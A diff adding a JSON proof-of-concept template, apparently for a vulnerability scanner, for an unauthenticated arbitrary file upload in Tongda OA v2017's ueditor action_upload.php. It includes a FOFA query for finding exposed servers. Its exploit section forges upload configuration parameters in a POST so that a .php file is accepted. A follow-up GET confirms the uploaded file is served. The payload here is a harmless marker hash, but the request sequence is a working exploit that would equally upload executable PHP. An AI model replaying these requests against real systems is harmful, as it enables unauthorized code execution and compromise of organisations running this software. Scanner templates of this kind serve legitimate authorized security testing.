@@ -1,0 +1,65 @@
+{
+  "product": "通达OA",
+  "vul_name": "通达OA v2017 action_upload.php 任意文件上传",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "通达OA v2017 action_upload.php 文件过滤不足且无需后台权限，导致任意文件上传漏洞",
+  "version": "通达OA v2017",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"TDXK-通达OA\""
+  },
+  "protocol": "http",
+  "link": "https://peiqi.wgpsec.org/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2017%20action_upload.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html",
+  "fix": [],
+  "exploit": [
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/module/ueditor/php/action_upload.php?action=uploadfile",
+        "data": {
+          "CONFIG[fileFieldName]": "ffff",
+          "CONFIG[fileMaxSize]": "1000000000",
+          "CONFIG[filePathFormat]": "52e039302a62d077",
+          "CONFIG[fileAllowFiles][]": ".php",
+          "mufile": "submit"
+        },
+        "file": {
+          "ffff": [
+            "52e039302a62d077.php",
+            "95cc64dd2825f9df13ec4ad683ecf339",
+            "application/octet-stream"
+          ]
+        }
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/52e039302a62d077.php"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "body": "95cc64dd2825f9df13ec4ad683ecf339"
+          }
+        ]
+      }
+    }
+  ]
+}
